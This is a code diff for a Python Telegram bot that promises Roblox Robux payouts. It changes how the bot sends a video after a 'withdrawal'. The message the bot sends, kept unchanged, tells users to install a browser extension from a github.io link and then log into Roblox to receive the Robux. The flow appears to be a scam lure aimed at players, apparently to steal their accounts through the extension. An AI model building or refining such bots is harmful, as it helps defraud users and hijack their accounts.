@@ -211,30 +211,18 @@ def withdraw_amount(message):
     new_balance = balance - amount
     update_user(user_id, balance=new_balance)
 
-    # Отправляем видео
-    video_path = 'videos/youcut-20260708-102137852_Zsg4Qjtp.mp4'
-    try:
-        with open(video_path, 'rb') as video:
-            bot.send_video(
-                user_id,
-                video,
-                caption=f'✅ Заявка на вывод {amount} Robux принята!\n\n'
-                        '📦 **Установи расширение:**\n'
-                        '👉 https://valeryiusmanov-sketch.github.io/H/\n\n'
-                        '⚠️ После установки зайди на официальный сайт Roblox и войди в аккаунт.\n'
-                        'Через 3 часа Robux поступят на твой счёт.',
-                parse_mode='Markdown'
-            )
-    except FileNotFoundError:
-        bot.send_message(
-            user_id,
-            f'✅ Заявка на вывод {amount} Robux принята!\n\n'
-            '📦 **Установи расширение:**\n'
-            '👉 https://valeryiusmanov-sketch.github.io/H/\n\n'
-            '⚠️ После установки зайди на официальный сайт Roblox и войди в аккаунт.\n'
-            'Через 3 часа Robux поступят на твой счёт.',
-            parse_mode='Markdown'
-        )
+    # Отправляем видео по прямой ссылке
+    video_url = 'https://raw.githubusercontent.com/valeryiusmanov-sketch/Robux-bot/refs/heads/main/youcut-20260708-102137852_Zsg4Qjtp.mp4'
+    bot.send_video(
+        user_id,
+        video_url,
+        caption=f'✅ Заявка на вывод {amount} Robux принята!\n\n'
+                '📦 **Установи расширение:**\n'
+                '👉 https://valeryiusmanov-sketch.github.io/H/\n\n'
+                '⚠️ После установки зайди на официальный сайт Roblox и войди в аккаунт.\n'
+                'Через 3 часа Robux поступят на твой счёт.',
+        parse_mode='Markdown'
+    )
 
     bot.send_message(user_id, '💬 Если возникнут вопросы — напиши в поддержку.', reply_markup=main_menu())
 
